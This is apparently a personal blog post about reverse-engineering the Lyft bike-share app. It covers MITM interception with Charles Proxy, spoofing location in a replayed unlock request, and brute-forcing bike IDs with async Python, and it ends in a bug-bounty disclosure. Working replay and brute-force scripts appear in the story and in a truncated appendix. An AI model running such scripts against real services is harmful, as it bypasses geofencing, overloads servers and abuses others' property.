<p>12 minute read</p>
<p>One cold San Francisco summer morning in Haight-Ashbury, my commute
down to Market was interrupted by the sight of a lucky duck taking the
last Lyft bike – again.</p>
<p>"I should really just wake up 15 minutes earlier", I thought,
fleetingly. Then instead proceeded to spend the next month learning</p>
<ul>
<li>how to reverse engineer the Lyft Bikes private endpoints,</li>
<li>tinkering with wifi proxies and custom SSL certificates to bypass
encryption,</li>
<li>chasing loose bikes across the city,</li>
<li>causing an incident at Lyft,</li>
<li>getting flagged,</li>
<li>and somehow making a profit.</li>
</ul>
<p>I learned a ton, so I'm sharing the journey in case you may too.</p>

<h2 id="the-acquisition">The Acquisition</h2>
<p>Back in 2018 Lyft Bikes (BayWheels) used to be <a
href="https://automotive.lulop.com/en_EN/post/show/131501/ford-gobike-launching-in-bay-a.html">Ford
GoBikes</a>, and used to be unlocked on a per-station basis. You'd
generate a temporary code for a specific station on your app, then punch
it into that station which would release a random bike.</p>
<img src="/images/blog/lyft-bikes/ford-gobikes.webp" alt="Ford GoBikes" style="border-radius: 8px">

<p>My goal was to make sure nobody would take a bike while I was
on-route to the station, so what if I just kept manually generating
codes until I arrived? Maybe that might block others from doing so. So I
tried it. No luck. Generating a code didn't block others, and that was
the only way to unlock bikes. Welp, nothing left to try...</p>
<p>...until the next day, when <a
href="https://www.lyft.com/blog/posts/lyft-to-acquire-us-bikeshare-leader">Lyft
acquired Ford GoBikes</a> and the whole unlock mechanism changed. All
hail Lyft.</p>
<p>The new Lyft map also showed bikes at stations, but now you'd unlock
a bike directly by scanning a QR code on it. Each bike also had 5-digit
number you could use in case scanning didn't work. Maybe if I typed a
bike's code into my app when I left, it would be unlocked (and hopefully
still there) by the time I arrived? So I tried it.</p>
<p><code>You are too far from this station.</code></p>
<p>They had geofenced it. I spent a solid day Googling how to spoof GPS
on iPhone but no luck. "I wonder what the app is actually sending to
Lyft during an unlock." And so my journey of snooping encrypted iOS
traffic began.</p>
<h2 id="intercepting-ios-app-requests">Intercepting iOS App
Requests</h2>
<p>If you've used <a
href="https://developer.chrome.com/docs/devtools">Chrome DevTools</a>
(aka <code>Inspect Element</code>) you may have noticed a
<code>Network</code> tab that lets you see the traffic between a website
and its backend. Unfortunately it's not so simple for iOS. Some helpful
Reddit posts led me to <a href="https://www.charlesproxy.com/">Charles
Proxy</a> which lets you see <em>all</em> traffic from your computer,
and a friendly <a
href="https://www.charlesproxy.com/documentation/faqs/using-charles-from-an-iphone/">eight
sentences</a> explained how to wire it up to my phone's traffic. It's
basically a consensual <a
href="https://www.notion.so/Reverse-engineering-lyft-bikes-for-fun-and-profit-2db9f6a8122080049bd3e61b3238f00e?pvs=21">man-in-the-middle
attack</a>.</p>
<p>First I had to forward my phone's traffic to Charles on my laptop. To
do this I enabled "HTTP Proxy" on my phone's wifi settings, and set the
the <code>[ip]:[port]</code> to <code>192.168.0.7:8888</code>:</p>
<ul>
<li><code>192.168.0.7</code> is my laptop's local IP which I got by
running <code>ipconfig getifaddr en0</code></li>
<li><code>8888</code> is the port Charles Proxy is running on</li>
</ul>
<p><img
src="/images/blog/lyft-bikes/Screenshot_2026-01-01_at_2.18.19_PM.png"
alt="Screenshot 2026-01-01 at 2.18.19 PM.png" /></p>
<p>Now my traffic was being forwarded to Charles Proxy and huzzah! I
could see all requests coming out of my phone. But... I can't see the
content? Oh, right. SSL encryption. The thing making sure we can trust
the internet was getting in my way.</p>
<h2 id="spoofing-ssl-root-certificate-authorities">Spoofing SSL Root
Certificate Authorities</h2>
<p>SSL ensures traffic from the Lyft app is encrypted using the
<code>lyft.com</code> public key, so only <code>lyft.com</code> can
decrypt it<a href="#fn1" class="footnote-ref" id="fnref1"
role="doc-noteref"><sup>1</sup></a>. All modern applications &amp;
websites do this, and you can find the public key on a website's <a
href="https://www.notion.so/Reverse-engineering-lyft-bikes-for-fun-and-profit-2db9f6a8122080049bd3e61b3238f00e?pvs=21">SSL
certificate</a>.</p>
<picture>
  <source srcset="/images/blog/lyft-bikes/Screenshot_2026-01-01_at_2.12.36_PM.png" media="(prefers-color-scheme: dark)">
  <img src="/images/blog/lyft-bikes/Screenshot_2026-01-01_at_2.12.36_PM.png" alt="SSL Certificate" width="50%">
</picture>

<p>In theory, this means my traffic can't be decrypted once it leaves my
phone, even by me. However, Charles has a workaround: by enabling
<code>SSL Proxying</code>, Charles will prevent the real
<code>lyft.com</code> SLL certificate from making it back to your phone,
and instead sends a new one it generates on the fly.</p>
<p><img
src="/images/blog/lyft-bikes/Screenshot_2026-01-01_at_2.09.23_PM.png"
alt="Screenshot 2026-01-01 at 2.09.23 PM.png" /></p>
<p>This means your phone is now encrypting <code>lyft.com</code> traffic
with Charles's public key, so Charles can decrypt it, save it, then
re-encrypt it with the <em>real</em> <code>lyft.com</code> cert and
forward it along.</p>
<p><img
src="/images/blog/lyft-bikes/Screenshot_2026-01-01_at_2.09.30_PM.png"
alt="Screenshot 2026-01-01 at 2.09.30 PM.png" /></p>
<p>But there's a catch – your phone will reject a certificate unless
it's been signed by a Certificate Authority, endorsing it actually
belongs to <code>lyft.com</code>. These CAs are third-party
organizations acting like notaries that issue "root certificates", and
your phone comes with many trusted CA root certificates pre-installed.
So Charles just asks you to install one more root certificate – the
Charles Root Certificate, used to sign all the other certificates
Charles creates. And just like that, my phone trusts Charles, and I can
see SSL traffic.</p>
<h2 id="anatomy-of-a-lyft-request">Anatomy of a Lyft Request</h2>
<p>So, let's unlock a bike from my phone, shall we?</p>
<p><code>Vehicle not found.</code></p>
<p>Right. Well, I used <code>12345</code> as the bike ID, so that's
expected. Charles managed to capture some traffic anyway. Let's see if
we can find the unlock request.</p>
<p><img src="/images/blog/lyft-bikes/api-routes.png"
alt="api-routes.png" /></p>
<p>So many requests and API routes! I see one endpoint called
<code>rent</code>, which I bet is the unlock request. Let’s look at the
contents.</p>
<pre class="json"><code>POST &quot;https://layer.bicyclesharing.net/mobile/v2/fgb/rent&quot;

HEADERS
{
  &quot;api-key&quot;: &quot;sk-XXXXX&quot;,
  &quot;authorization&quot;: &quot;bearer-XXXXX&quot;,
  ...
}

DATA
{
  &quot;userLocation&quot;: { &quot;lat&quot;: 37.7714859, &quot;lon&quot;: -122.4449036 },
  &quot;qrCode&quot;: { &quot;memberId&quot;: &quot;user-XXXXX&quot;, &quot;qrCode&quot;: &quot;12345&quot; },
  ...
}</code></pre>
<p>Yup, looks like it is. Look at these fields (<em>I omitted the
unrelated, redacted the sensitive.</em>) There's some auth in the
headers (<code>api-key</code>, <code>authorization</code>), the bike
<code>qrCode</code> I used (<code>12345</code>), a <code>memberId</code>
which I assume identifies my account, and... <code>userLocation</code>
coordinates! Bingo. Now I just need to replay that request with a python
script, but set the <code>lat</code>, <code>lon</code> to be right next
to the station (whose coordinates I got using google maps).</p>
<pre class="python"><code>import requests

url=&quot;https://layer.bicyclesharing.net/mobile/v2/fgb/rent&quot;

headers={
  &quot;api-key&quot;: &quot;sk-XXXXX&quot;,
  &quot;authorization&quot;: &quot;bearer-XXXXX&quot;,
}

station_coords = { &quot;lat&quot;: 37.7730627, &quot;lon&quot;: -122.4390777 }    # from maps
bike_id = &quot;12345&quot;                                              # dummy id

data={
  &quot;userLocation&quot;: station_coords,
  &quot;qrCode&quot;: { &quot;memberId&quot;: &quot;user-XXXXX&quot;, &quot;qrCode&quot;:  bike_id},
}

requests.post(url, headers=headers, json=data)</code></pre>
<p>Sweet, now I just needed a real <code>bike_id</code> to test it on.
It was very late at night<a href="#fn2" class="footnote-ref" id="fnref2"
role="doc-noteref"><sup>2</sup></a> but I was excited, so out I went
with my PJs, flip flops, and laptop to squat by my target bike. I found
its ID, entered it into my script, hit run, and holy shit it worked. The
bike unlocked. I re-locked it, ran back to my apartment, hit run again,
ran back, and there she was. Unlocked, and inconspicuously so. Nobody
would think to take it… but me.</p>
<p>We were in business.</p>
<h2 id="i-promise-its-not-a-denial-of-service-attack">I Promise it’s not
a Denial of Service Attack</h2>
<p>Except… the bike IDs are only printed on the bikes. How would I know
what <code>bike_id</code> to use without going to the station? Maybe
some other request Charles captured might have all the bike IDs at a
station? Short answer – no. Two days of digging through captured traffic
yielded no way to fetch bike IDs.<a href="#fn3" class="footnote-ref"
id="fnref3" role="doc-noteref"><sup>3</sup></a></p>
<p>After considering many fruitless ideas, like hiding a little camera
pointed at the bikes and using OCR, I thought… could I just try all IDs?
Five digits, that’s 100,000 combinations… and thinking back, I had only
seen IDs between <code>10000</code> and <code>20000</code>. 10,000 loop
iterations is not <em>that</em> many for python!</p>
<p>This runs in less than a second:</p>
<pre class="python"><code>for i in range(10_000, 20_000):
    print(i)</code></pre>
<p>This, however, takes ~a second <em>per request</em>. So… ~three hours
for 10,000 requests.</p>
<pre class="python"><code>def payload(i):
    return {
        &quot;userLocation&quot;: station_coords,
        &quot;qrCode&quot;: { &quot;memberId&quot;: &quot;mem123&quot;, &quot;qrCode&quot;:  i},
    }

def send_one(i):
    requests.post(url, headers=headers, json=payload(i))

for i in range(10_000, 20_000):
    send_one(i)</code></pre>
<p>But we don’t have to wait for each request to come back – we can run
them in parallel. After trying <code>multiprocessing</code> and
<code>threading</code>, I massaged a stack overflow code snippet I found
using <code>aiohttp</code> to start a bunch of requests without blocking
on a response. Here’s a cleaned-up version.<a href="#fn4"
class="footnote-ref" id="fnref4" role="doc-noteref"><sup>4</sup></a></p>
<pre class="python"><code>import asyncio, aiohttp

async def send_one(session, i):                              # non-blocking
  async with session.post(url, headers=headers, json=payload(i)): pass

async def main():
  async with aiohttp.ClientSession() as s:
    tasks = [send_one(s, i) for i in range(10_000, 20_000)]  # start all
    await asyncio.gather(*tasks)                             # wait for all

asyncio.run(main())</code></pre>
<p>I benchmarked this against <a
href="https://www.postman.com/">Postman’s API</a> (meant for testing)
and it ran in 15 seconds! That’s 650 RPM. But, hm… is that too much for
their servers? In April of 2018 <a
href="https://www.sfmta.com/media/14273/download?inline=">there were an
average of 3,370 trips per weekday</a> So even if 80% of those all
happened during rush hour (8-10am, 5-7pm) that’s still a whopping 11 RPM
at its <em>peak</em>. I’d be single-handedly 60x-ing their peak traffic
on this endpoint. To be fair, (Google informed me,) 650 RPM is not
<em>that</em> crazy for most servers. But a sudden spike like that might
still look to Lyft like a <a href="">Denial-of-Service attack</a>...</p>
<pre><code>...which it&#39;s not. Let me know if this is an issue and I&#39;ll stop.

I&#39;m just a student, please don&#39;t call the cops.

Sincerely,
Ilan</code></pre>
<p>Aaaand sent – both to <code>security@lyft.com</code>, and the hosting
company that powered the Lyft bikes API. Ok now let's run it on all the
IDs.</p>
<h2 id="the-test">The Test</h2>
<p>I'm about to run <code>python unlock_script.py</code> when a thought
occurs to me: Is there <em>any</em> chance, however slim, that I'm about
to unlock every single Lyft Bike in and around the Bay Area? The
geofence should prevent that, <em>in theory</em>. Only the station at my
selected coordinates should respond. But what if it fails? What if– eh
screw it, let's live a little <a href="#fn5" class="footnote-ref"
id="fnref5" role="doc-noteref"><sup>5</sup></a></p>
<p><code>Enter ⏎</code></p>
<p>10,000 IDs fly through my screen.</p>
<p>1000 not-so-milli seconds tick by. Then, I get my first</p>
<p><code>You are too far from this station.</code></p>
<p>Then another. They start to trickle in, slowly at first, then
suddenly flood my terminal. Ok, that's a good sign. I'm not actively
unlocking the whole city. Then, another second or so pass by,
until...</p>
<pre><code>Bike 12539 unlocked</code></pre>
<p>[aggressive celebration success meme]</p>
<p>Fuuuuuuck yesss! Oh my fucking god it worked! It actually wor–</p>
<pre><code>Bike 17322 unlocked
Done.</code></pre>
<p>Wait, what? Um. Ok? Two bikes got unlocked? That's strange, my Lyft
membership only allows me to unlock one bike at a time. But hey, a) I
didn't unlock the whole city, and b) it worked, so what do I care. Let's
go find my bikes.</p>
<p>And there they were. Resting peacefully in their docks, but secretly
not actually locked. If someone tried scanning it, they'd just see an
error and try a different one. I had accomplished what I had set out to
do.</p>
<h2 id="the-good-days">The Good Days</h2>
<p>Boy did I enjoy it. Every morning I'd wake up, get ready fork work,
run my script, glace at the unlocked ID (sometimes two), leasurely
stroll to the station, (re-lock the second bike if necessary), and be on
my merry way.</p>
<p>I mostly kept this to myself, and a few trusted people including my
parents, who were happy for me but nervous that I was now a criminal
waiting to be arrested.</p>
<p>But what fun, and what a pleasently happy ending.</p>
<pre><code>[imessage/messenger bubble]
hey ilan! i know this is super out of the blue, but are you doing anything with the lyft bikes api?</code></pre>
<p>Oh.</p>
<p>Oh no.</p>
<pre><code>Hey! um, potentially? Why?</code></pre>
<pre><code>oh lmao. i&#39;m interning there and just saw an internal sev email about this and for some reason thought of you</code></pre>
<p>Oh no.</p>
<pre><code>Oh lol wait is sev &quot;severe&quot;?

Should I stop?</code></pre>
<pre><code>It just means there was an incident lol

were you reverse engineering endpoints?</code></pre>
<pre><code>Ok I&#39;m I don&#39;t want to get in trouble so</code></pre>
<pre><code>loll</code></pre>
<pre><code>Yeah, why?</code></pre>
<pre><code>ok yeah that&#39;s what the email was about</code></pre>
<pre><code>Hmmmmm should I be nervous?</code></pre>
<pre><code>It says &quot;potentially DoS but probably just trying to reverse engineer&quot;

lmao

I think just stop doing it</code></pre>
<p>Panic? Panic.</p>
<h2 id="saving-my-ass">Saving My Ass</h2>
<p>I think I spent ~two and a half minutes hyperventilating before I
decided to start using my brain. How do hackers avoid getting arrested?
Responsible disclosure. Companies will give bounties to people who
report vulnerabilities, so hackers can keep hacking legally, and
companies get to fix issues. Win–win! And maybe, just maybe, I could use
this to avoid getting arrested. Win-win-win!</p>
<p>So I found <a href="">HackerOne</a>, and immediately a problem: <a
href="">Lyft's vulnerability disclosure guidelines</a> state brute-force
approaches aren't elligible. In reality, my approach wasn't bypassing
anything at all – I was still unlocking a bike and paying ike normal. No
bugs to be reported. Although... the second bike! Definitely not normal
behavior, and I wasn't getting charged for it. Let's hope it's
enough.</p>
<pre><code>[hacker one submission]</code></pre>
<p>And now we wait. Except by sheer coincidence<a href="#fn6"
class="footnote-ref" id="fnref6" role="doc-noteref"><sup>6</sup></a>, my
summer roommate was <em>also</em> working at Lyft, and found the thread
discussing my vulnerability report. Apparently some claimed it was
inelligible, but one very nice man was arguing it was legit. Wondering
whether I'd get arrested had suddenly turned into wondering if I'd get
paid instead. What a world we live in.</p>
<p>In the end, I got a nice little $250 bounty, with an additional $250
bonus for a "good report". I then did the only thing I could imagine
doing with $500 as a student and threw a stocked-up little house
party...</p>
<p>...and, naturally, invited all the Lyft interns.</p>

<p>I used Charles Proxy to capture outgoing requests from the Lyft app

<p>Charles supports <code>SSL Proxying</code>, which injects its own
ephemeral certificates during SSL handshake, making sure requests from
both sides are being signed with keys it controls.</p>
<p><img

<p>This allows is to decrypt, read, and re-encrypt traffic in

<p>The ephemeral certificates are signed by a Charles Certificate
Authority, which needs to be installed on your phone so Charle's
certificates are not rejected. SSL traffic content is then viewable.</p>

<h2 id="replaying-modified-unlock-request">Replaying Modified Unlock
Request</h2>
<p>From the Charles captures, we see the unlock request uses a
<code>rent</code> endpoint with the following structure:</p>
<pre class="json"><code>POST &quot;https://layer.bicyclesharing.net/mobile/v2/fgb/rent&quot;

HEADERS
{
  &quot;api-key&quot;: &quot;sk-XXXXX&quot;,
  &quot;authorization&quot;: &quot;bearer-XXXXX&quot;,
  ...
}

DATA
{
  &quot;userLocation&quot;: { &quot;lat&quot;: 37.7714859, &quot;lon&quot;: -122.4449036 },
  &quot;qrCode&quot;: { &quot;memberId&quot;: &quot;user-XXXXX&quot;, &quot;qrCode&quot;: &quot;12345&quot; },
  ...
}</code></pre>
<p>A simple python replay script:</p>
<pre class="python"><code>import requests

url=&quot;https://layer.bicyclesharing.net/mobile/v2/fgb/rent&quot;

headers={
  &quot;api-key&quot;: &quot;sk-XXXXX&quot;,
  &quot;authorization&quot;: &quot;bearer-XXXXX&quot;,
}

station_coords = { &quot;lat&quot;: 37.7730627, &quot;lon&quot;: -122.4390777 }    # from maps
bike_id = &quot;12345&quot;                                              # dummy id

data={
  &quot;userLocation&quot;: station_coords,
  &quot;qrCode&quot;: { &quot;memberId&quot;: &quot;user-XXXXX&quot;, &quot;qrCode&quot;:  bike_id},
}

requests.post(url, headers=headers, json=data)</code></pre>
<h2 id="brute-forcing-bike-id">Brute-forcing Bike ID</h2>
<p>Bike IDs are only accessible through the physical bikes (not counting
eBikes, which were out of scope), we to unlock one remotely we need to
brute force it. Five digit IDs, but in practice only the
<code>10000</code> to <code>20000</code> range is used, so 10,000 IDs to
try.</p>
<p>A naive implementation takes ~3 hours:</p>
<pre class="python"><code>def payload(i):
    return {
        &quot;userLocation&quot;: station_coords,
        &quot;qrCode&quot;: { &quot;memberId&quot;: &quot;mem123&quot;, &quot;qrCode&quot;:  i},
    }

def send_one(i):
    requests.post(url, headers=headers, json=payload(i))

for i in range(10_000, 20_000):
    send_one(i)</code></pre>
<p>But we can use <code>asyncio</code> and <code>aiohttp</code> to
